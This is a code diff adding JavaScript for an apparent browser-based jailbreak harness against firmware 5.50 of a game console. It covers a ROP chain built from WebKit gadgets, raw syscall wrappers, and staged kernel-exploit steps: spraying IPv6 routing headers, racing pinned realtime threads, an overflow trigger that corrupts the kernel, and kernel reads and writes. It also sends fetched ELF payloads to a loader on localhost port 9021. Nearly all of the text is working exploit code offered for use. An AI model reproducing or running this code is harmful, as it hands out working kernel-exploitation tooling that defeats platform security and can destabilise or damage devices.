+    const tiles = payloadMenuEl.getElementsByTagName("a");
+    for (let i = 0; i < tiles.length; ++i)
+        if (tiles[i].getAttribute("data-name") === name) return true;
+    return false;
+}
+
+function payloadSyscallError(operation, result) {
+    let detail = result && result.errText
+        ? result.errText : "unknown syscall error";
+    if (result)
+        detail += " (s32=" + result.s32 + ", raw=" + result.hex + ")";
+    return new Error(operation + " failed: " + detail);
+}
+
+function preparePayloadSender() {
+    if (payloadSendStore === null)
+        payloadSendStore = mem(PAYLOAD_BUFFER_SIZE);
+    if (payloadSockaddrStore === null) {
+        payloadSockaddrStore = mem(0x10);
+        const addr = payloadSockaddrStore.u8;
+        addr.fill(0);
+        addr[0] = 0x10;
+        addr[1] = 0x02;
+        addr[2] = (PAYLOAD_PORT >>> 8) & 0xff;
+        addr[3] = PAYLOAD_PORT & 0xff;
+        addr[4] = 127;
+        addr[5] = 0;
+        addr[6] = 0;
+        addr[7] = 1;
+    }
+    if (payloadSocketOptionStore === null) {
+        payloadSocketOptionStore = mem(4);
+        payloadSocketOptionStore.u8.fill(0);
+        payloadSocketOptionStore.u8[0] = 1;
+    }
+    if (payloadSendTimeoutStore === null) {
+        payloadSendTimeoutStore = mem(0x10);
+        payloadSendTimeoutStore.u8.fill(0);
+        payloadSendTimeoutStore.u8[0] = 15;
+    }
+}
+
+async function sendPayloadToElfldr(name) {
+    if (!elfldrSpawned)
+        throw new Error("ELF loader is not ready");
+    if (!P || !chain)
+        throw new Error("the post-jailbreak ROP runtime is unavailable");
+    if (chainDead)
+        throw new Error("the ROP chain is unusable after " + chainDead);
+    if (payloadSenderBlocked)
+        throw new Error(payloadSenderBlocked);
+    if (!payloadIsListed(name))
+        throw new Error("payload is not listed in this menu");
+
+    const response = await fetch("../payloads/" + encodeURIComponent(name),
+        { cache: "no-store" });
+    if (!response.ok)
+        throw new Error("payload fetch failed: HTTP " + response.status);
+    const bytes = new Uint8Array(await response.arrayBuffer());
+    if (!bytes.length)
+        throw new Error("payload is empty");
+    if (bytes.length > PAYLOAD_MAX_SIZE)
+        throw new Error("payload is larger than the 2 MiB limit");
+    if (bytes.length < 4 || bytes[0] !== 0x7f || bytes[1] !== 0x45
+        || bytes[2] !== 0x4c || bytes[3] !== 0x46)
+        throw new Error("payload does not start with the ELF signature");
+
+    preparePayloadSender();
+    let fd = -1;
+    let sent = 0;
+    let failure = null;
+    let closeWarning = null;
+    try {
+        let result = await sys(SYS_SOCKET, 2, 1, 0);
+        if (result.failed || result.s32 < 0)
+            throw payloadSyscallError("socket", result);
+        fd = result.s32;
+        track(fd);
+
+        result = await sys(SYS_SETSOCKOPT, fd, 0xffff, 0x0800,
+            payloadSocketOptionStore.ptr, 4);
+        if (result.failed || result.s32 !== 0)
+            throw payloadSyscallError("setsockopt SO_NOSIGPIPE", result);
+
+        result = await sys(SYS_SETSOCKOPT, fd, 0xffff, 0x1005,
+            payloadSendTimeoutStore.ptr, 0x10);
+        if (result.failed || result.s32 !== 0)
+            throw payloadSyscallError("setsockopt SO_SNDTIMEO", result);
+
+        result = await sys(SYS_CONNECT, fd, payloadSockaddrStore.ptr, 0x10);
+        if (result.failed || result.s32 !== 0)
+            throw payloadSyscallError("connect to 127.0.0.1:9021", result);
+
+        while (sent < bytes.length) {
+            const blockSize = Math.min(PAYLOAD_BUFFER_SIZE, bytes.length - sent);
+            payloadSendStore.u8.set(bytes.subarray(sent, sent + blockSize), 0);
+            let blockSent = 0;
+            while (blockSent < blockSize) {
+                result = await sys(SYS_WRITE, fd,
+                    payloadSendStore.ptr.add32(blockSent), blockSize - blockSent);
+                if (result.failed || result.s32 <= 0)
+                    throw payloadSyscallError("write at byte "
+                        + (sent + blockSent), result);
+                blockSent += result.s32;
+            }
+            sent += blockSize;
+        }
+    } catch (error) {
+        failure = error;
+    }
+
+    if (fd >= 0 && !chainDead) {
+        try {
+            const result = await sys(SYS_CLOSE, fd);
+            if (result.failed || result.s32 !== 0) {
+                const error = payloadSyscallError("close", result);
+                if (failure === null && sent === bytes.length)
+                    closeWarning = error;
+                else if (failure === null)
+                    failure = error;
+                else
+                    failure = new Error(failure.message + "; additionally, "
+                        + error.message);
+            } else {
+                untrack(fd);
+            }
+        } catch (error) {
+            if (failure === null && sent === bytes.length)
+                closeWarning = error;
+            else if (failure === null)
+                failure = error;
+            else
+                failure = new Error(failure.message + "; additionally, close failed: "
+                    + (error && error.message ? error.message : error));
+        }
+    } else if (fd >= 0 && failure !== null) {
+        failure = new Error(failure.message + "; socket fd " + fd
+            + " remains tracked because the ROP chain is unusable");
+    }
+
+    if (fd >= 0 && state.fdOpen.has(fd))
+        payloadSenderBlocked = "payload sending is blocked until reboot because "
+            + "socket fd " + fd + " was not confirmed closed";
+
+    if (failure !== null) throw failure;
+    return { name, bytes: sent, target: "127.0.0.1", port: PAYLOAD_PORT,
+        closeWarning: closeWarning };
+}
+
+async function sendPayloadInPlace(name, tile) {
+    if (payloadSendBusy) return;
+    payloadSendBusy = true;
+    const tiles = payloadMenuEl.getElementsByTagName("a");
+    for (let i = 0; i < tiles.length; ++i)
+        tiles[i].className = "payloadTile busy";
+    tile.className = "payloadTile";
+    setPayloadTileState(tile, "sending");
+    try {
+        const result = await sendPayloadToElfldr(name);
+        tile.className = "payloadTile";
+        setPayloadTileState(tile, "sent");
+        flushMark("ELF-SENT", "name=" + clean(result.name) + "-bytes="
+            + result.bytes + "-target=" + clean(result.target)
+            + "-port=" + result.port);
+        if (result.closeWarning)
+            flushMark("ELF-SOCKET-CLOSE-WARN", "name=" + clean(result.name)
+                + "-why=" + clean(result.closeWarning.message || result.closeWarning));
+    } catch (error) {
+        tile.className = "payloadTile";
+        setPayloadTileState(tile, "failed");
+        flushMark("ELF-SEND-FAILED", "name=" + clean(name) + "-why="
+            + clean(error && error.message ? error.message : error));
+    } finally {
+        if (payloadSenderBlocked) {
+            payloadSendBusy = true;
+            for (let i = 0; i < tiles.length; ++i)
+                tiles[i].className = "payloadTile busy";
+            setCatResult(false);
+            flushMark("ELF-SENDER-BLOCKED", clean(payloadSenderBlocked));
+        } else {
+            payloadSendBusy = false;
+            for (let i = 0; i < tiles.length; ++i)
+                if (tiles[i] !== tile) tiles[i].className = "payloadTile";
+            try { tile.focus(); } catch (e) { }
+        }
+    }
+}
+
+{
+    const tiles = payloadMenuEl.getElementsByTagName("a");
+    for (let i = 0; i < tiles.length; ++i) {
+        const tile = tiles[i];
+        tile.onclick = function (e) {
+            if (e && e.preventDefault) e.preventDefault();
+            sendPayloadInPlace(tile.getAttribute("data-name"), tile);
+            return false;
+        };
+    }
+}
+
+function stage(text, cls) {
+    if (cls === "bad") setCatResult(false);
+    if (elfldrSpawned && cls === "bad") return;
+    stageEl.textContent = text;
+    stageEl.className = cls || "";
+    if (cls === "bad") failCurrentHud("CHAIN FAILED // CHECK RUNTIME LOG");
+}
+function danger(text) {
+    if (elfldrSpawned) return;
+    setCatResult(false);
+    dangerEl.textContent = text;
+    dangerEl.className = "";
+}
+
+function clearFailureBanners() {
+    dangerEl.textContent = "";
+    dangerEl.className = "";
+    verdictEl.textContent = "";
+    verdictEl.className = "";
+}
+
+function setCatResult(success) {
+    const cat = document.getElementById("cat");
+    const failureMessage = document.getElementById("failureMessage");
+    if (failureMessage) failureMessage.className = success ? "" : "on";
+    if (cat) {
+        cat.className = success ? "ok" : "bad";
+    }
+}
+
+function verdictBanner(kind, text) {
+    if (kind === "bad") setCatResult(false);
+    if (elfldrSpawned && kind === "bad") return;
+    verdictEl.textContent = text;
+    verdictEl.className = kind || "";
+}
+function vitals(text) { vitalsEl.textContent = text; vitalsEl.className = "on"; }
+
+function showVerdict(reboot, text) {
+    if (reboot) setCatResult(false);
+    if (elfldrSpawned && reboot) {
+        rebootEl.textContent = "ELF LOADER READY";
+        rebootEl.className = "on fine";
+        return;
+    }
+    rebootEl.textContent = text;
+    rebootEl.className = reboot ? "" : "fine";
+}
+
+function vitalsText(prefix) {
+    const common = prefix + cfg.sockets + " IPv6 SOCKETS (up to "
+        + (cfg.sockets * 360) + " BYTES of kernel routing headers, sprayed and " + "freed repeatedly), 2 AF_UNIX SOCKETPAIRS, 2 PIPES, and TWELVE " + "raw kernel threads pinned to one core at PRI_REALTIME/256.\n";
+    if (cfg.trigger === "none")
+        return common
+            + "TRIGGER: NONE";
+    if (cfg.trigger === "netcontrol")
+        return common
+            + "TRIGGER: NETCONTROL";
+    return common
+        + "TRIGGER: OVERFLOW (p2jb's prepare_fds)" + "corrupt the kernel if burn=full.\n" + "  * RLIMIT_NOFILE raised, up to " + 2048 + " descriptors opened.\n" + "  * setuid(1) x2 -- IRREVERSIBLE for the rest of the boot.\n" + "  * burn=" + cfg.burn + "";
+}
+
+let chainMarksQuiet = false;
+function jbMarkSink(tag, extra) {
+    if (chainMarksQuiet) queueEvent(tag, extra);
+    else flushMark(tag, extra);
+}
+function setChainMarksQuiet(quiet) {
+    const was = chainMarksQuiet;
+    chainMarksQuiet = !!quiet;
+    return was;
+}
+if (!window.jb) window.jb = {};
+if (typeof window.jb.mark !== "function") window.jb.mark = jbMarkSink;
+
+function row(idx, entry, status, detail, notes) {
+    let tr = rowByKey.get(entry.key);
+    if (tr === undefined) {
+        tr = document.createElement("tr");
+        tr.innerHTML = '<td class="n"></td><td class="k"></td>'
+            + '<td class="st"></td><td class="d"></td>';
+        rowsEl.appendChild(tr);
+        rowByKey.set(entry.key, tr);
+    }
+    tr.children[0].textContent = String(idx);
+    tr.children[1].innerHTML = "";
+    const nm = document.createElement("span");
+    nm.textContent = entry.label;
+    const cl = document.createElement("span");
+    cl.className = "cls";
+    cl.textContent = entry.cls;
+    tr.children[1].appendChild(nm);
+    tr.children[1].appendChild(cl);
+    tr.children[2].textContent = status;
+    tr.children[2].className = "st " + status;
+
+    tr.className = "r-" + status;
+
+    const d = tr.children[3];
+    d.innerHTML = "";
+    const main = document.createElement("span");
+    main.className = status === "FAIL" ? "why" : "";
+    main.textContent = detail || "";
+    d.appendChild(main);
+    for (const n of (notes || [])) {
+        const s = document.createElement("span");
+        s.className = "note";
+        s.textContent = "> " + n;
+        d.appendChild(s);
+    }
+    return tr;
+}
+
+const CARRY_PARAMS = { payload: /^(1|dry)$/ };
+function carryParams(href) {
+    const keep = [];
+    for (const k of Object.keys(CARRY_PARAMS)) {
+        const v = Q.get(k);
+        if (v !== null && CARRY_PARAMS[k].test(v)) keep.push(k + "=" + v);
+    }
+    if (!keep.length) return href;
+    return href + (href.indexOf("?") >= 0 ? "&" : "?") + keep.join("&");
+}
+
+function link(href, text, kind) {
+    const a = document.createElement("a");
+    a.href = carryParams(href);
+    a.tabIndex = navLive ? -1 : 0;
+    a.textContent = text;
+    if (kind) a.className = kind;
+    navEl.appendChild(a);
+}
+
+let navLive = false;
+let runInFlight = false;
+
+function unloadBeacon(kind) {
+    try { unloadBeaconInner(kind); } catch (e) {
+        try { window.__jbRaw("UNLOAD-BEACON-THREW", (e && e.message) || e); }
+        catch { }
+    }
+}
+function unloadBeaconInner(kind) {
+    const liveSockets = engine ? engine.TW.S.n : 0;
+    const liveFds = state.fdOpen.size;
+    if (!runInFlight && !liveSockets && !liveFds && !chainDead) return;
+    flushMark("PAGE-LEFT-MID-RUN", kind + "-at=" + (currentKey || "boot")
+        + "-phase=" + (runInFlight ? "in-run" : "after-run")
+        + "-sockets=" + liveSockets
+        + "-trackedFds=" + liveFds
+        + "-triggered=" + (engine && engine.triggered ? 1 : 0)
+        + "-alias=" + (engine && engine.corrupt ? 1 : 0)
+        + "-triplet=" + (engine && engine.TW.tripletsValid() ? 1 : 0)
+        + "-chainDead=" + (chainDead ? clean(chainDead) : "no")
+        + "-latch=" + (latchState || "unknown"));
+}
+window.addEventListener("pagehide", () => unloadBeacon("pagehide"));
+window.addEventListener("beforeunload", () => unloadBeacon("beforeunload"));
+
+function lockNav(live) {
+    navLive = live;
+    navEl.hidden = live;
+    navEl.style.pointerEvents = live ? "none" : "";
+    const as = navEl.getElementsByTagName("a");
+    for (let i = 0; i < as.length; ++i) as[i].tabIndex = live ? -1 : 0;
+}
+
+const WATCHDOG_MS = 15000;
+let P = null, chain = null;
+let chainDead = "";
+let syscallCount = 0;
+let errConvention = "posix";
+
+function numText(n) {
+    return "0x" + n.toString(16).toUpperCase().padStart(3, "0");
+}
+function classify(raw) {
+    const hi = raw.hi >>> 0, lo = raw.low >>> 0;
+    const failed = (hi === 0xffffffff) && (lo >= 0xfffff000);
+    return { failed, s32: lo | 0 };
+}
+function errText(res) {
+    if (!res.failed) return "ok";
+    const n = -res.s32;
+    if (errConvention === "raw") {
+        if (res.s32 === -1)
+            return "ret=-1 (ambiguous: -1 is also the POSIX failure sentinel)";
+        return "errno " + n + (ERRNO[n] ? " " + ERRNO[n] : "");
+    }
+    if (res.s32 === -1) return "ret=-1, errno set but not readable from here";
+    return "ret=" + res.s32 + " (would be " + (ERRNO[n] || ("errno " + n))
+        + " if the stubs returned -errno)";
+}
+
+function killChain(what) {
+    chainDead = what;
+    state.cleanupFailed = state.cleanupFailed || ("the ROP chain died at '"
+        + what + "'");
+    flushMark("CHAIN-DEAD", what);
+}
+
+async function watchdog(promise, what) {
+    let timer = null;
+    try {
+        return await Promise.race([
+            promise,
+            new Promise((_, rej) => {
+                timer = setTimeout(() => rej(new Error("WATCHDOG")), WATCHDOG_MS);
+            })
+        ]);
+    } catch (err) {
+        if (err && err.message === "WATCHDOG") killChain(what);
+        throw err;
+    } finally {
+        if (timer !== null) clearTimeout(timer);
+    }
+}
+
+async function sys(num, a, b, c, d, e, f) {
+    if (chainDead)
+        throw new Error("sys: the chain is unusable after '" + chainDead + "'");
+    if (Object.prototype.hasOwnProperty.call(BANNED, num))
+        throw new Error("sys: syscall " + numText(num) + " is BANNED -- "
+            + BANNED[num]);
+    if (P.syscalls[num] === undefined)
+        throw new Error("sys: " + numText(num) + " has no stub in the 5.50 map");
+    syscallCount++;
+    state.syscallsIssued.add(num);
+    const t0 = Date.now();
+    const raw = await watchdog(chain.syscall(num, a, b, c, d, e, f),
+        "syscall " + numText(num));
+    state.roundTrips.push(Date.now() - t0);
+    const cl = classify(raw);
+    const res = { raw, s32: cl.s32, failed: cl.failed,
+        hex: "0x" + raw.toString(), errText: "" };
+    res.errText = errText(res);
+    return res;
+}
+
+async function runChain() {
+    if (chainDead)
+        throw new Error("runChain: the chain is unusable after '" + chainDead + "'");
+    const t0 = Date.now();
+    await watchdog(chain.run(), "chain.run");
+    state.roundTrips.push(Date.now() - t0);
+}
+
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+function mem(n) {
+    const ptr = P.malloc(n, 1);
+    return { ptr, u8: ptr.backing };
+}
+
+const state = {
+    syscallsIssued: new Set(),
+    roundTrips: [],
+    heapBytes: 0,
+    syncBlocks: 0, syncBytes: 0,
+    threadObjectsBuilt: 0, threadsCreated: 0, threadsExited: 0,
+    tornWrites: [],
+    groups: [],
+    fdOpen: new Set(), fdBaseline: -1,
+    cleanupFailed: ""
+};
+const track = fd => state.fdOpen.add(fd);
+const untrack = fd => state.fdOpen.delete(fd);
+let currentNotes = [];
+const note = s => {
+    currentNotes.push(s);
+    queueEvent("NOTE", (currentKey ? currentKey + "-" : "")
+        + String(s).replace(/[\r\n\t]+/g, " ")
+            .replace(/[^\x20-\x7e]/g, "").slice(0, 300));
+};
+const PASS = detail => ({ status: "PASS", detail });
+const FAIL = detail => ({ status: "FAIL", detail });
+
+const NA = detail => ({ status: "SKIP", detail });
+
+const driver = {
+    origMaskBytes: null, origMaskHex: "", origPrioType: -1, origPrio: -1,
+    core: -1, coreWhy: "", tid: 0, pid: 0, pinned: false,
+
+    prioChanged: false, affChanged: false
+};
+
+const nogcHard = { carrier: null, p: null, chain: null };
+
+async function preflight() {
+    if (typeof prepare !== "function")
+        throw new Error("main.js did not evaluate -- `prepare` is undefined.");
+    if (typeof worker_rop !== "function")
+        throw new Error("rop.js did not evaluate -- `worker_rop` is undefined");
+    if (typeof SYS_GETPID === "undefined")
+        throw new Error("syscalls.js did not evaluate -- SYS_GETPID is undefined");
+
+    await window.offsetsReady;
+    flushMark("OFFSETS-READY", "fw=" + window.fw_str
+        + "-gadgets=" + Object.keys(wk_gadgetmap).length
+        + "-syscalls=" + Object.keys(syscall_map).length);
+
+    if (!wk_gadgetmap || !Object.keys(wk_gadgetmap).length
+        || !syscall_map || !Object.keys(syscall_map).length)
+        throw new Error("../offsets/" + window.fw_str + ".js loaded but is empty: "
+            + Object.keys(wk_gadgetmap || {}).length + " gadgets, "
+            + Object.keys(syscall_map || {}).length + " syscalls.");
+
+    let verdict = "ok";
+    try {
+        const r = await fetch("rop_slave.js", { cache: "no-store" });
+        if (!r.ok) verdict = "http-" + r.status;
+    } catch (err) { verdict = "fetch-threw"; }
+    if (verdict === "ok") {
+        let w = null;
+        verdict = await new Promise(resolve => {
+            let done = false;
+            const finish = v => {
+                if (done) return;
+                done = true;
+                try { if (w) w.terminate(); } catch { }
+                resolve(v);
+            };
+            const t = setTimeout(() => finish("timeout"), 4000);
+            try {
+                w = new Worker("rop_slave.js");
+                w.onmessage = () => { clearTimeout(t); finish("ok"); };
+                w.onerror = () => { clearTimeout(t); finish("worker-error"); };
+                w.postMessage(0);
+            } catch (err) { clearTimeout(t); finish("worker-threw"); }
+        });
+    }
+    flushMark("WORKER-PROBE", verdict);
+    if (verdict !== "ok")
+        throw new Error("rop_slave.js is not usable (" + verdict + ")");
+}
+
+function assertInt64Identity() {
+    if (globalThis.int64 !== int64)
+        throw new Error("int64: two constructors in the page");
+    flushMark("INT64-IDENTITY-OK", "");
+}
+
+function assertBases() {
+    const named = [
+        ["wk", P.libSceNKWebKitBase],
+        ["lc", P.libSceLibcInternalBase],
+        ["lk", P.libKernelBase]
+    ];
+    const parts = [];
+    for (const [n, b] of named) {
+        flushMark("BASE-PRE", n + "=0x" + b.toString() + "-check=band+align");
+        if ((b.low & 0x3fff) !== 0)
+            throw new Error(n + " base 0x" + b.toString() + " is not aligned");
+        if ((b.hi >>> 0) !== 8)
+            throw new Error(n + " base 0x" + b.toString() + " is outside the band");
+        parts.push(n + "=0x" + b.toString());
+    }
+    flushMark("BASES", parts.join("-") + "-band=ok-align=0x4000");
+    if (typeof OFFSET_wk___stack_chk_guard_import === "number"
+        && typeof OFFSET_lk___stack_chk_guard === "number") {
+        const slot = P.libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import);
+        flushMark("BASE-XCHECK-PRE", "slot=0x" + slot.toString() + "-next=read8");
+        const seen = P.read8(slot);
+        const derived = seen.sub32(OFFSET_lk___stack_chk_guard);
+        const agree = derived.low === P.libKernelBase.low
+            && derived.hi === P.libKernelBase.hi;
+        flushMark("BASE-XCHECK", "derived-lk=0x" + derived.toString()
+            + "-prepare-lk=0x" + P.libKernelBase.toString() + "-agree=" + agree);
+        if (!agree)
+            throw new Error("libkernel base disagreement");
+    }
+}
+
+async function probeErrnoConvention() {
+    const r = await sys(0x006, 0x7fffffff);
+    if (r.failed && r.s32 === -1) errConvention = "posix";
+    else if (r.failed) errConvention = "raw";
+    else errConvention = "unknown";
+    flushMark("ERRNO-CONVENTION", errConvention + "-ret=" + r.s32);
+}
+
+const REFERENCE_CHAIN_ENTRY = "run_" + "ps" + "free";
+function refuseReferenceChain() {
+    if (typeof window[REFERENCE_CHAIN_ENTRY] === "function") {
+        flushMark("REFERENCE-CHAIN-PRESENT-REFUSING", REFERENCE_CHAIN_ENTRY);
+        stage("refusing to run -- the reference chain's entry point is loaded",
+            "bad");
+        throw new Error("the reference chain's entry point is present");
+    }
+    flushMark("REFERENCE-CHAIN-ABSENT", "only-slopkit-can-satisfy-this-page");
+}
+
+async function chooseCore() {
+    const m = mem(K.CPUSET_SIZE);
+    for (let i = 0; i < K.CPUSET_SIZE; ++i) m.u8[i] = 0;
+    flushMark("INHERITED-MASK-PRE", "syscall=cpuset_getaffinity-0x1E7-buf=0x"
+        + m.ptr.toString());
+    const r = await sys(0x1E7, K.CPU_LEVEL_WHICH, K.CPU_WHICH_TID,
+        new int64(0xffffffff, 0xffffffff), K.CPUSET_SIZE, m.ptr);
+    if (r.failed)
+        throw new Error("cpuset_getaffinity failed (" + r.errText
+            + "). Refusing to pin anything blind.");
+    const bytes = new Uint8Array(K.CPUSET_SIZE);
+    for (let i = 0; i < K.CPUSET_SIZE; ++i) bytes[i] = m.u8[i];
+    const word = r32(bytes, 0);
+    driver.origMaskBytes = bytes;
+    driver.origMaskHex = hexBytes(bytes, 0, K.CPUSET_SIZE);
+    flushMark("INHERITED-MASK", "mask=0x" + word.toString(16) + "-cores="
+        + coreList(word) + "-bytes=" + driver.origMaskHex);
+    if (word === 0)
+        throw new Error("the inherited affinity mask is 0");
+    let core = -1;
+    if (CORE_OVERRIDE >= 0) {
+        if (CORE_OVERRIDE > 15 || ((word >>> CORE_OVERRIDE) & 1) === 0)
+            throw new Error("?core=" + CORE_OVERRIDE + " is not set in the "
+                + "inherited mask 0x" + word.toString(16) + " (available: "
+                + coreList(word) + "). cpuset_setaffinity would fail and every "
+                + "test below would still appear to work.");
+        core = CORE_OVERRIDE;
+        driver.coreWhy = "chosen explicitly with ?core=" + CORE_OVERRIDE
+            + " and confirmed present in the inherited mask";
+    } else {
+        for (let i = 15; i >= 0; --i) if ((word >>> i) & 1) { core = i; break; }
+        driver.coreWhy = "the highest core set in the INHERITED mask 0x"
+            + word.toString(16) + " (available: " + coreList(word) + "). "
+            + "Derived, not hardcoded: poops.c:52 uses 5 and p2jb.js:193 uses "
+            + "4, and neither exists here.";
+    }
+    if (core < 0 || core > 15)
+        throw new Error("no usable core in 0..15 from mask 0x" + word.toString(16));
+    driver.core = core;
+    flushMark("CORE-CHOSEN", "core=" + core);
+    return core;
+}
+
+let engine = null;
+let LADDER = [];
+let currentKey = "";
+let ctx = null;
+
+function makeContext() {
+    ctx = {
+        P, chain, i64: (lo, hi) => new int64(lo, hi),
+        sys, runChain, mem, flushMark, queueEvent, sleep, note, PASS, FAIL, NA,
+        track, untrack, state, cfg, latch, stage, driver,
+        WATCHDOG_MS, setChainMarksQuiet,
+
+        setRaceMode, repaintScreen,
+
+        markStats, flushQueue, verdictBanner,
+        chainDeadNow: () => !!chainDead,
+        measured: {},
+        stalledAt: STALLED_AT, lastRun: LAST_RUN,
+        filteredRun: FILTERED_RUN, only: ONLY.slice(), from: FROM
+    };
+    engine = makePoopsEngine(ctx);
+    engine.setFamily(cfg.trigger);
+    return ctx;
+}
+
+let cleanupClaimed = false;
+
+async function runLadder() {
+    const X = ctx;
+    LADDER = buildLadder(X, engine);
+
+    let passed = 0, failed = 0, skipped = 0, filtered = 0;
+    let started = false, aborted = "";
+
+    for (let i = 0; i < LADDER.length; ++i)
+        row(i + 1, LADDER[i], "SKIP", "queued");
+
+    for (let i = 0; i < LADDER.length; ++i) {
+        const entry = LADDER[i];
+
+        if (entry.key === "ps7_report") continue;
+        if (ONLY.length && ONLY.indexOf(entry.key) < 0) {
+            filtered++;
+            row(i + 1, entry, "SKIP", "not in ?only=");
+            continue;
+        }
+        if (!ONLY.length && FROM && !started) {
+            if (entry.key !== FROM) {
+                filtered++;
+                row(i + 1, entry, "SKIP", "before ?from=" + FROM);
+                continue;
+            }
+            started = true;
+        }
+        if (state.cleanupFailed) {
+            skipped++;
+            row(i + 1, entry, "SKIP", "REFUSED -- an earlier step could not "
+                + "clean up: " + state.cleanupFailed);
+            continue;
+        }
+        if (chainDead) {
+            skipped++;
+            row(i + 1, entry, "SKIP", "chain unusable after '" + chainDead
+                + "'. Even the teardown is a chain round trip.");
+            continue;
+        }
+
+        storeSet(PROGRESS_KEY, entry.key);
+        currentKey = entry.key;
+        currentNotes = [];
+        row(i + 1, entry, "RUN", "running...");
+        flushMark("TEST-ENTER", entry.key
+            + (entry.hot ? "-chainMarks=queued" : "-chainMarks=blocking"));
+        let result;
+        const wasQuiet = setChainMarksQuiet(!!entry.hot);
+        try {
+            result = await entry.run();
+            if (!result) result = FAIL("the test returned nothing");
+        } catch (err) {
+            const m = (err && err.message) || String(err);
+            if (m === "WATCHDOG") {
+                aborted = entry.key;
+                result = FAIL("WATCHDOG: no reply from the ROP worker in "
+                    + WATCHDOG_MS + " ms. launch_chain has no timeout of its "
+                    + "own (main.js:393-399).");
+            } else {
+                result = FAIL("THREW " + (err && err.name) + ": " + m.slice(0, 400));
+            }
+        } finally {
+            setChainMarksQuiet(wasQuiet);
+        }
+        if (result.status === "PASS") passed++;
+        else if (result.status === "SKIP") skipped++;
+        else failed++;
+        row(i + 1, entry, result.status, result.detail, currentNotes);
+        flushMark("TEST", entry.key + "-" + result.status
+            + (result.detail
+                ? "-why=" + String(result.detail).replace(/[\r\n\t]+/g, " ")
+                    .replace(/[^\x20-\x7e]/g, "").slice(0, 400)
+                : ""));
+        if (state.cleanupFailed) danger("cleanup failure: " + state.cleanupFailed);
+
+        if (aborted || result.status === "FAIL") {
+            if (!aborted) aborted = entry.key + " (FAIL)";
+            for (let k = i + 1; k < LADDER.length; ++k) {
+                if (LADDER[k].key === "ps7_report") continue;
+                skipped++;
+                row(k + 1, LADDER[k], "SKIP", "REFUSED after '" + entry.key
+                    + "' failed");
+            }
+            break;
+        }
+    }
+
+    let reportRow = null;
+    for (const e of LADDER) if (e.key === "ps7_report") reportRow = e;
+    const reportIdx = reportRow ? LADDER.indexOf(reportRow) + 1 : 0;
+    let reportResult = null;
+    if (reportRow && chainDead) {
+        skipped++;
+        row(reportIdx, reportRow, "SKIP", "IMPOSSIBLE -- the chain died at '"
+            + chainDead + "'");
+    } else if (reportRow && !engine) {
+        skipped++;
+        row(reportIdx, reportRow, "SKIP", "no engine was built");
+    } else if (reportRow && !cleanupClaimed) {
+        cleanupClaimed = true;
+        currentKey = "ps7_report";
+        currentNotes = [];
+        flushMark("TEST-ENTER", "ps7_report-forced");
+        try {
+            reportResult = await reportRow.run();
+        } catch (err) {
+            reportResult = FAIL("PS7 THREW: " + ((err && err.message) || err));
+        }
+        row(reportIdx, reportRow, reportResult.status, reportResult.detail,
+            currentNotes);
+        if (reportResult.status === "PASS") passed++; else failed++;
+        flushMark("TEST", "ps7_report-" + reportResult.status);
+    }
+
+    let stranded = [];
+    const noClose = (engine && engine.S && engine.S.doNotClose)
+        ? engine.S.doNotClose : new Set();
+    const sweepBlocked = engine && engine.corrupt ? "alias-present"
+        : (engine && engine.triggered ? "trigger-fired"
+            : (chainDead ? "chain-dead"
+                : (state.cleanupFailed ? "cleanup-failed"
+                    : ((engine && engine.S && engine.S.groupsStillLive.length)
+                        ? "racer-group-still-parked" : ""))));
+    const sweepable = Array.from(state.fdOpen).filter(fd => !noClose.has(fd));
+    if (sweepable.length && !sweepBlocked) {
+        for (const fd of sweepable) {
+            try { await sys(0x006, fd); } catch { }
+            state.fdOpen.delete(fd);
+        }
+        flushMark("FD-SWEEP", "closed=" + sweepable.length + "-skipped="
+            + noClose.size + "-fds=" + sweepable.slice(0, 24).join("."));
+    } else if (sweepable.length) {
+        flushMark("FD-STRANDED", "n=" + sweepable.length + "-why=" + sweepBlocked
+            + "-fds=" + sweepable.slice(0, 24).join("."));
+    }
+
+    const strandSet = new Set(noClose);
+    for (const fd of state.fdOpen) strandSet.add(fd);
+    stranded = Array.from(strandSet);
+    if (noClose.size)
+        flushMark("FD-DO-NOT-CLOSE", "n=" + noClose.size + "-fds="
+            + Array.from(noClose).slice(0, 24).join("."));
+
+    currentKey = "";
+
+    const rt = state.roundTrips;
+    const rtMean = rt.length
+        ? Math.round(rt.reduce((a, b) => a + b, 0) / rt.length * 10) / 10 : -1;
+    const rtMax = rt.length ? Math.max.apply(null, rt) : -1;
+
+    tallyEl.textContent = passed + " PASS   " + failed + " FAIL   "
+        + skipped + " SKIP" + (filtered ? "   " + filtered + " FILTERED" : "");
+    tallyEl.style.color = failed ? "#e05561" : "#47c76a";
+
+    const v = (ctx.measured && ctx.measured.verdict) || null;
+    const mustReboot = v ? !!v.reboot : true;
+    const lines = [];
+    lines.push("rows: " + LADDER.length + " = " + passed + " pass + " + failed
+        + " fail + " + skipped + " skip + " + filtered + " filtered");
+    if (engine) {
+        lines.push("TRIGGER: " + cfg.trigger
+            + (cfg.trigger === "overflow" ? " (burn=" + cfg.burn + ")" : "")
+            + "   |   fired: " + (engine.triggered ? "YES -- " + engine.triggered
+                : "no")
+            + "   |   alias observed: " + (engine.corrupt ? "YES" : "no")
+            + "   |   triplet: " + (engine.TW.tripletsValid()
+                ? engine.TW.S.triplets.join(",") : "none"));
+        lines.push("crfrees issued: " + engine.S.crfrees
+            + "   |   setuid(1) calls: " + engine.S.setuidCalls
+            + "   |   kread_slow: " + engine.S.kreadOk + " ok of "
+            + engine.S.kreadCalls
+            + "   |   kqueues opened/closed: " + engine.S.kqueuesOpened + "/"
+            + engine.S.kqueuesClosed
+            + "   |   kernel writes: " + engine.kernelWrites);
+        if (engine.S.masterPipeData)
+            lines.push("STAGE 2 OUTPUT (printed and discarded; stage 3's input, " + "and stage 3 is not built): master_pipe and victim_pipe are " + "in the PS6 row above and in the beacon log");
+    }
+    if (ctx && ctx.measured.rt)
+        lines.push("MEASURED chain.run(): " + ctx.measured.rt.a.toFixed(2)
+            + " ms fixed + " + (ctx.measured.rt.b * 1000).toFixed(1)
+            + " us per in-chain syscall.");
+    if (ctx && ctx.measured.stage0)
+        lines.push("STAGE 0: " + ctx.measured.stage0.attempts + " attempts in "
+            + ctx.measured.stage0.ms + " ms = "
+            + (ctx.measured.stage0.ms
+                / Math.max(1, ctx.measured.stage0.attempts)).toFixed(0)
+            + " ms/attempt.");
+    lines.push("chain round trips: " + rt.length + ", mean " + rtMean
+        + " ms, worst " + rtMax + " ms; one-at-a-time syscalls " + syscallCount
